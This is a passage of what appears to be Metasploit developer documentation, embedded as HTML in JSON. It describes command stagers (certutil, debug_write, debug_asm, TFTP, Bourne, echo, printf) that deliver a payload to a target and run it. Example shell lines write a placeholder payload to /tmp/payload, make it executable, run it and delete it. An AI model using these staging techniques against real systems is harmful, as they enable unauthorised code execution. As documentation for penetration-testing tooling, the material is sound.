certutil to decode it, and then finally execute it.</p>\n<p>To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'certutil'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :certutil key to execute_cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:certutil</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You will also need to remember to set the platform in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'Platform'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'win'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"debug_write-command-stager---windows-only\" style=\"position:relative;\"><a href=\"#debug_write-command-stager---windows-only\" aria-label=\"debug_write command stager   windows only permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Debug_write Command Stager - Windows Only</h2>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">debug_write</a> command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute.</p>\n<p>Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net.</p>\n<p>To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'debug_write'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :debug<em>write key to execute</em>cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:debug_write</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You will also need to remember to set the platform in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'Platform'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'win'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"debug_asm-command-stager---windows-only\" style=\"position:relative;\"><a href=\"#debug_asm-command-stager---windows-only\" aria-label=\"debug_asm command stager   windows only permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Debug_asm Command Stager - Windows Only</h2>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">debug_asm</a> command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it.</p>\n<p>To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'debug_asm'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :debug<em>asm key to execute</em>cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:debug_asm</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You will also need to remember to set the platform in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'Platform'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'win'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"tftp-command-stager---windows-only\" style=\"position:relative;\"><a href=\"#tftp-command-stager---windows-only\" aria-label=\"tftp command stager   windows only permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TFTP Command Stager - Windows Only</h2>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/tftp.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">TFTP</a> command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default.</p>\n<p>The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">rvmsudo ./msfconsole</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To use the TFTP stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'tftp'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :tftp key to execute_cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:tftp</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You will also need to remember to set the platform in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'Platform'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'win'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"bourne-command-stager---multi-platform\" style=\"position:relative;\"><a href=\"#bourne-command-stager---multi-platform\" aria-label=\"bourne command stager   multi platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bourne Command Stager - Multi Platform</h2>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/bourne.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Bourne</a> command stager supports multiple platforms except for Windows (because the use of the which command that Windows does not have). It functions rather similar to the VBS stager, except when it decodes the Base64 payload at runtime, there are multiple commands to choose from: base64, openssl, python, or perl.</p>\n<p>To use the Bourne stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'bourne'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :bourne key to execute_cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:bourne</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"echo-command-stager---multi-platform\" style=\"position:relative;\"><a href=\"#echo-command-stager---multi-platform\" aria-label=\"echo command stager   multi platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Echo Command Stager - Multi Platform</h2>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/echo.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">echo</a> command stager is suitable for multiple platforms except for Windows. It just <a href=\"http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">echos</a> the payload, chmod and execute it. An example of that looks similar to this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">echo -en \\\\x41\\\\x41\\\\x41\\\\x41 &gt;&gt; /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To use the echo stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'echo'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :bourne key to execute_cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:echo</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"printf-command-stager---multi-platform\" style=\"position:relative;\"><a href=\"#printf-command-stager---multi-platform\" aria-label=\"printf command stager   multi platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Printf Command Stager - Multi Platform</h2>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/printf.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">printf</a> command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">printf &#39;\\177\\177\\177\\177&#39; &gt;&gt; /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To use the printf stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'printf'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :bourne key to execute_cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:printf</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>"}},"pageContext":{"id":"338e9891-4231-54d5-9b5c-a5974cb9a137"}}}